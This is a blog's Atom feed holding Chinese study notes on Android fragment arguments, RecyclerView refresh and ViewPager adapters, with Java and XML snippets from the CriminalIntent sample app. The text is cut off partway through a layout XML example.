<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>苏乞儿&#39; Blog</title>
  
  <subtitle>人生一世，草木一秋</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.suqir.xyz/"/>
  <updated>2020-04-03T15:12:49.115Z</updated>
  <id>https://blog.suqir.xyz/</id>
  
  <author>
    <name>苏乞儿</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android编程权威指南学习笔记三</title>
    <link href="https://blog.suqir.xyz/2020/03/30/Android%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://blog.suqir.xyz/2020/03/30/Android%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/</id>
    <published>2020-03-30T11:35:48.000Z</published>
    <updated>2020-04-03T15:12:49.115Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章将继续学习《Android编程权威指南》的第10-12章</p><a id="more"></a><h1 id="第十章-使用fragment-argument"><a href="#第十章-使用fragment-argument" class="headerlink" title="第十章 使用fragment argument"></a>第十章 使用fragment argument</h1><h2 id="从-fragment-中启动-activity"><a href="#从-fragment-中启动-activity" class="headerlink" title="从 fragment 中启动 activity"></a>从 fragment 中启动 activity</h2><p>从 fragment 中 启 动 activity 类 似 于 从 activity 中 启 动 activity 。 我 们 调 用 <code>Fragment.startActivity(Intent)</code>方法，由它在后台再调用对应的Activity方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent(getActivity(), CrimeActivity.class);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p>由于不知道该显示哪个Crime对象，因此<code>CrimeFragment</code>没有显示出具体的<code>Crime</code>信息  </p><h3 id="附加-extra-信息"><a href="#附加-extra-信息" class="headerlink" title="附加 extra 信息"></a>附加 extra 信息</h3><p>启动<code>CrimeActivity</code>时，传递附加到Intent extra上的crime ID， <code>CrimeFragment</code>就能知道该<br>显示哪个Crime。这需要在<code>CrimeActivity</code>中新增<code>newIntent</code>方法.创建了显式intent后，调用<code>putExtra(...)</code>方法，传入匹配<code>crimeId</code>的字符串键与键值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeActivity</span> <span class="keyword">extends</span> <span class="title">SingleFragmentActivity</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String EXTRA_CRIME_ID = <span class="string">"com.bignerdranch.android.criminalintent.crime_id"</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Intent <span class="title">newIntent</span><span class="params">(Context packageContext, UUID crimeId)</span> </span>&#123;</span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent(packageContext, CrimeActivity.class);</span><br><span class="line">intent.putExtra(EXTRA_CRIME_ID, crimeId);</span><br><span class="line"><span class="keyword">return</span> intent;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更新<code>CrimeHolder</code>，使用<code>newIntent</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeHolder</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">ViewHolder</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">Intent intent = CrimeActivity.newIntent(getActivity(), mCrime.getId());</span><br><span class="line">startActivity(intent);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取-extra-信息"><a href="#获取-extra-信息" class="headerlink" title="获取 extra 信息"></a>获取 extra 信息</h3><p>crime ID现已安全存储到<code>CrimeActivity</code>的intent中。然而，要获取和使用extra信息的是<code>CrimeFragment</code>类</p><p>fragment有两种方式获取intent中的数据：一种简单直接，另一种复杂但比较灵活（涉及fragment argument的概念）</p><ul><li><h4 id="简单的方法"><a href="#简单的方法" class="headerlink" title="简单的方法"></a>简单的方法</h4><p><code>CrimeFragment</code>直接使用<code>getActivity()</code>方法获取<code>CrimeActivity</code>的<code>intent</code></p><p><strong>缺点</strong>：这种方式破坏了fragment的封装，CrimeFragment不再是可复用的构建单元，因为它现在由某个特定的activity托管着，该特定activity的Intent又定义了名为<code>com.bignerdranch.android.criminalintent.crime_id</code>的extra</p></li><li><h4 id="复杂但灵活的方法-fragment-argument"><a href="#复杂但灵活的方法-fragment-argument" class="headerlink" title="复杂但灵活的方法(fragment argument)"></a>复杂但灵活的方法(fragment argument)</h4><h5 id="附加-argument-给-fragment"><a href="#附加-argument-给-fragment" class="headerlink" title="附加 argument 给 fragment"></a>附加 argument 给 fragment</h5><p>每个fragment实例都可附带一个Bundle对象。该bundle包含键值对，我们可以像附加extra到Activity的intent中那样使用它们。一个键-值对即一个argument</p><p>要创建fragment argument，首先需创建Bundle对象。然后，使用Bundle限定类型的put方法（类似于Intent的方法），将argument添加到bundle中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bundle args = <span class="keyword">new</span> Bundle();</span><br><span class="line">args.putSerializable(ARG_MY_OBJECT, myObject);</span><br><span class="line">args.putInt(ARG_MY_INT, myInt);</span><br><span class="line">args.putCharSequence(ARG_MY_STRING, myString);</span><br></pre></td></tr></table></figure><p>要附加argument bundle给fragment，需调用Fragment.setArguments(Bundle)方法。而且，还必须在fragment创建后、添加给activity前完成</p><p>为满足以上要求， Android开发人员采取的习惯做法是：添加名为newInstance()的静态方法给Fragment类。使用该方法，完成fragment实例及Bundle对象的创建，然后将argument放入bundle中，最后再附加给fragment</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeFragment</span> <span class="keyword">extends</span> <span class="title">Fragment</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ARG_CRIME_ID = <span class="string">"crime_id"</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CrimeFragment <span class="title">newInstance</span><span class="params">(UUID crimeId)</span> </span>&#123;</span><br><span class="line">Bundle args = <span class="keyword">new</span> Bundle();</span><br><span class="line">args.putSerializable(ARG_CRIME_ID, crimeId);</span><br><span class="line">CrimeFragment fragment = <span class="keyword">new</span> CrimeFragment();</span><br><span class="line">fragment.setArguments(args);</span><br><span class="line"><span class="keyword">return</span> fragment;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在， 需创建CrimeFragment时， CrimeActivity应调用<code>CrimeFragment.newInstance(UUID)</code>方法，并传入从它的extra中获取的UUID参数值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Fragment <span class="title">createFragment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">UUID crimeId = (UUID) getIntent().getSerializableExtra(EXTRA_CRIME_ID);</span><br><span class="line"><span class="keyword">return</span> CrimeFragment.newInstance(crimeId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意， activity和 fragment不需要也无法同时相互保持独立。托管activity应该知道这些细节，以便托管fragment；但fragment不一定需要知道其托管activity的细节问题，至少在需要保持fragment通用独立的时候如此</p><h5 id="获取-argument"><a href="#获取-argument" class="headerlink" title="获取 argument"></a>获取 argument</h5><p>fragment需要获取它的argument时，会先调用Fragment类的<code>getArguments()</code>方法，再调用Bundle限定类型的get方法，如<code>getSerializable(...)</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">UUID crimeId = (UUID) getArguments().getSerializable(ARG_CRIME_ID);</span><br><span class="line">mCrime = CrimeLab.get(getActivity()).getCrime(crimeId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="刷新显示列表"><a href="#刷新显示列表" class="headerlink" title="刷新显示列表"></a>刷新显示列表</h2><p>CrimeListFragment启动CrimeActivity实例后， CrimeActivity被置于回退栈顶。这导致原先处于栈顶的CrimeListActivity实例被暂停并停止。用户点击后退键返回到列表项界面， CrimeActivity随即弹出栈外并被销毁。此时， CrimeListActivity立即重新启动并恢复运行：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记三/1.png" alt="1"></p><p>CrimeListActivity恢复运行后，操作系统会发出调用onResume()生命周期方法的指令。CrimeListActivity接到指令后，它的FragmentManager会调用当前被activity托管的fragment的onResume()方法。这里的fragment就是指CrimeListFragment</p><p>在CrimeListFragment中，覆盖onResume()方法，触发调用<code>updateUI()</code>方法刷新显示列表项</p><p>如果已配置好CrimeAdapter，就调用<code>notifyDataSetChanged()</code>方法来修改<code>updateUI()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.onResume();</span><br><span class="line">updateUI();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updateUI</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CrimeLab crimeLab = CrimeLab.get(getActivity());</span><br><span class="line">    List&lt;Crime&gt; crimes = crimeLab.getCrimes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mAdapter == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mAdapter = <span class="keyword">new</span> CrimeAdapter(crimes);</span><br><span class="line">        mCrimeRecyclerView.setAdapter(mAdapter);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mAdapter.notifyDataSetChanged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般来说，要保证fragment视图得到刷新，在onResume()方法内更新代码是最安全的选择</p><h2 id="通过-fragment-获取返回结果"><a href="#通过-fragment-获取返回结果" class="headerlink" title="通过 fragment 获取返回结果"></a>通过 fragment 获取返回结果</h2><p>如需从已启动的activity获取返回结果，可调用<code>Fragment.startActivityForResult(...)</code>方法，并覆盖<code>Fragment.onActivityResult(...)</code>方法。</p><p>fragment能够从activity中接收返回结果，但其自身无法持有返回结果。只有activity拥有返回结果。因此，尽管Fragment有自己的<code>startActivityForResult(...)</code>方法和<code>onActivityResult(...)</code>方法，但没有<code>setResult(...)</code>方法。相反，应让托管activity返回结果值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeFragment</span> <span class="keyword">extends</span> <span class="title">Fragment</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">returnResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">getActivity().setResult(Activity.RESULT_OK, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="深入学习：为何要用-fragment-argument"><a href="#深入学习：为何要用-fragment-argument" class="headerlink" title="深入学习：为何要用 fragment argument"></a>深入学习：为何要用 fragment argument</h2><p>fragment argument的使用有点复杂。为什么不直接在CrimeFragment里创建一个实例变量呢？</p><p>创建实例变量的方式并不可靠。这是因为，在操作系统重建fragment时（设备配置发生改变）用户暂时离开当前应用（操作系统按需回收内存），任何实例变量都将不复存在。尤其是内存不够，操作系统强制杀掉应用的情况，可以说是无人能挡。</p><p>因此，可以说， fragment argument就是为应对上述场景而生</p><p>还有另一个方法应对上述场景，那就是使用实例状态保存机制。具体来说，就是将crime ID赋 值 给 实 例 变 量 ， 然 后 在<code>onSaveInstanceState(Bundle)</code>方 法 中 保 存 下 来 。 要 用 时 ， 从<code>onCreate(Bundle)</code>方法中的Bundle中取回。然而，这种解决方案的维护成本高。举例来说，如果你在若干年后要修改fragment代码以添加其他argument，很可能会忘记在<code>onSaveInstanceState(Bundle)</code>方法里保存新增的argument</p><h2 id="挑战练习：实现高效的-RecyclerView-刷新"><a href="#挑战练习：实现高效的-RecyclerView-刷新" class="headerlink" title="挑战练习：实现高效的 RecyclerView 刷新"></a>挑战练习：实现高效的 RecyclerView 刷新</h2><p>Adapter的notifyDataSetChanged方法会通知RecyclerView刷新全部的可见列表项。</p><p>在CriminalIntent应用里，这个方法不够高效。这是因为，返回CrimeListFragment时，最多只有一个Crime实例会发生变化。</p><p>只需要刷新列表项中的单个crime项的话，应该使用<code>RecyclerView.Adapter</code>的<code>notifyItemChanged(int)</code>方法。修改代码调用这个方法很简单，但如何定位并刷新具体位置的列表项呢？这是一个挑战！</p><ol><li><p>在CrimeListFragment里面定义一个全局变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> itemPosition;</span><br></pre></td></tr></table></figure></li><li><p>修改CrimeListFragment里的onClick方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    itemPosition = getAdapterPosition();<span class="comment">// 获取当前position</span></span><br><span class="line">    Intent intent = CrimeActivity.newIntent(getActivity(), mCrime.getId());</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>修改updateUI方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updateUI</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CrimeLab crimeLab = CrimeLab.get(getActivity());</span><br><span class="line">    List&lt;Crime&gt; crimes = crimeLab.getCrimes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mAdapter == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mAdapter = <span class="keyword">new</span> CrimeAdapter(crimes);</span><br><span class="line">        mCrimeRecyclerView.setAdapter(mAdapter);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 一次刷新所有列表项</span></span><br><span class="line">        <span class="comment">// mAdapter.notifyDataSetChanged();</span></span><br><span class="line">        <span class="comment">// 只刷新某一项</span></span><br><span class="line">        mAdapter.notifyItemChanged(itemPosition);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="挑战练习：优化-CrimeLab-的表现"><a href="#挑战练习：优化-CrimeLab-的表现" class="headerlink" title="挑战练习：优化 CrimeLab 的表现"></a>挑战练习：优化 CrimeLab 的表现</h2><p>CrimeLab的<code>getCrime(UUID)</code>方法没毛病，但匹配要找的crime ID这个过程还可以再优化。请优化匹配逻辑，不过重构代码时，不要搞坏了CriminalIntent应用</p><p>这里可使用LinkedHashMap ，然后用UUID作为key来存储数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeLab</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CrimeLab sCrimeLab;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;UUID, Crime&gt; mCrimes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CrimeLab <span class="title">get</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sCrimeLab == <span class="keyword">null</span>) &#123;</span><br><span class="line">            sCrimeLab = <span class="keyword">new</span> CrimeLab(context);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sCrimeLab;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">CrimeLab</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        mCrimes = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            Crime crime = <span class="keyword">new</span> Crime();</span><br><span class="line">            crime.setTitle(<span class="string">"Crime #"</span> + i);</span><br><span class="line">            crime.setSolved(i % <span class="number">2</span> == <span class="number">0</span>);</span><br><span class="line">            mCrimes.put(crime.getId(), crime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Crime&gt; <span class="title">getCrimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;(mCrimes.values());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Crime <span class="title">getCrime</span><span class="params">(UUID id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mCrimes.get(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第十一章-使用ViewPager"><a href="#第十一章-使用ViewPager" class="headerlink" title="第十一章 使用ViewPager"></a>第十一章 使用ViewPager</h1><p>ViewPager在某种程度上类似于RecyclerView。 RecyclerView需借助于Adapter提供视图。同样， ViewPager需要PagerAdapter的支持</p><p>Google提供了PagerAdapter的子类FragmentStatePagerAdapter，它能协助处理许多细节问题</p><p>FragmentStatePagerAdapter化繁为简，提供了两个有用的方法： <code>getCount()</code>和<code>getItem(int)</code>。调用<code>getItem(int)</code>方法，获取并显示crime数组中指定位置的Crime时，它会返回配置过的CrimeFragment来显示指定的Crime</p><h2 id="FragmentStatePagerAdapter-与-FragmentPagerAdapter"><a href="#FragmentStatePagerAdapter-与-FragmentPagerAdapter" class="headerlink" title="FragmentStatePagerAdapter 与 FragmentPagerAdapter"></a>FragmentStatePagerAdapter 与 FragmentPagerAdapter</h2><p>FragmentPagerAdapter是另外一种可用的PagerAdapter，其用法与FragmentStatePagerAdapter基本一致。唯一的区别在于，卸载不再需要的fragment时， 各自采用的处理方法有所不同</p><p>FragmentStatePagerAdapter会销毁不需要的fragment。事务提交后， activity的FragmentManager中的fragment会被彻底移除。 FragmentStatePagerAdapter类名中的“state”表明：在销毁fragment时，可在onSaveInstanceState(Bundle)方法中保存fragment的Bundle信息。用户切换回来时，保存的实例状态可用来生成新的fragment</p><p><img src="/2020/03/30/Android编程权威指南学习笔记三/2.png" alt="2"></p><p>相比之下， FragmentPagerAdapter有不同的做法。对于不再需要的fragment， FragmentPagerAdapter会选择调用事务的detach(Fragment)方法来处理它，而非remove(Fragment)方法。也就是说， FragmentPagerAdapter只是销毁了而fragment的视图，而fragment实例还保留在FragmentManager中。因此FragmentPagerAdapter创建的fragment永远不会被销毁</p><p><img src="/2020/03/30/Android编程权威指南学习笔记三/3.png" alt="3"></p><p>选择哪种adapter取决于应用的要求。通常来说，使用FragmentStatePagerAdapter更节省内存。</p><p>另一方面，如果用户界面只需要少量固定的fragment，则FragmentPagerAdapter是安全、合适的选择。最常见的例子为使用tab选项页显示用户界面。例如，某些应用的明细视图所含内容较多，通常需分两页显示。这时就可以将这些明细信息分拆开来，以多页面的形式展现。显然，为用户界面添加支持滑动切换的ViewPager，能增强应用的触摸体验。此外，将fragment保存在内存中，更易于管理控制器层的代码。对于这种类型的用户界面，每个activity通常只有两三个fragment，基本不用担心有内存不足的风险</p><h2 id="深入学习：以代码的方式创建视图"><a href="#深入学习：以代码的方式创建视图" class="headerlink" title="深入学习：以代码的方式创建视图"></a>深入学习：以代码的方式创建视图</h2><p>以代码的方式创建视图很简单：调用视图类的构造方法，并传入Context参数。不创建任何布局文件，用代码就能创建完整的视图层级结构</p><p>但最好不要这样做</p><p>使用布局文件的好处：</p><ol><li>布局文件能很好地分离控制器层和视图层对象：视图定义在XML布局文件中，控制器层对象定义在Java代码中。这样，假设控制器层有代码修改的话，代码变更管理相对容易很多；反之亦然</li><li>使用布局文件，我们还能使用Android的资源适配系统，实现按设备属性自动调用合适的布局文件</li></ol><p>当然，布局文件也不是毫无缺点。如果应用只需一个视图，估计没人愿意麻烦地创建并实例化布局XML文件</p><h2 id="挑战练习：恢复-CrimeFragment-的边距"><a href="#挑战练习：恢复-CrimeFragment-的边距" class="headerlink" title="挑战练习：恢复 CrimeFragment 的边距"></a>挑战练习：恢复 CrimeFragment 的边距</h2><p>可能你已经注意到了， CrimeFragment的边距没有了。奇怪啊，在fragment_crime.xml文件里，明明已指定过16dp的边距：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_margin</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:orientation</span>=<span class="string">"vertical"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发生了什么？原来， ViewPager的布局参数是不支持边距设置的。请修改fragment_crime.xml布局文件，让边距能够显示出来。</p><p>将<code>android:layout_margin=&quot;16dp&quot;</code>修改为<code>android:padding=&quot;16dp&quot;</code></p><h2 id="挑战练习：添加-Jump-to-First-按钮和-Jump-to-Last-按钮"><a href="#挑战练习：添加-Jump-to-First-按钮和-Jump-to-Last-按钮" class="headerlink" title="挑战练习：添加 Jump to First 按钮和 Jump to Last 按钮"></a>挑战练习：添加 Jump to First 按钮和 Jump to Last 按钮</h2><p>给CrimePagerActivity添加两个按钮。允许使用它们快速跳至第一条和最后一条crime记录。当然，要注意控制，查看第一条记录时应禁用Jump to First按钮，查看最后一条时禁用Jump to Last按钮</p><ol><li><p>修改<code>activity_crime_pager.xml</code>添加两个Button并分别设置id为<code>btn_first</code>和<code>btn_last</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">android.support.constraint.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">android.support.v4.view.ViewPager</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/activity_crime_pager_view_pager"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">android.support.v4.view.ViewPager</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/btn_first"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"32dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Jump to First"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"@+id/activity_crime_pager_view_pager"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/btn_last"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span 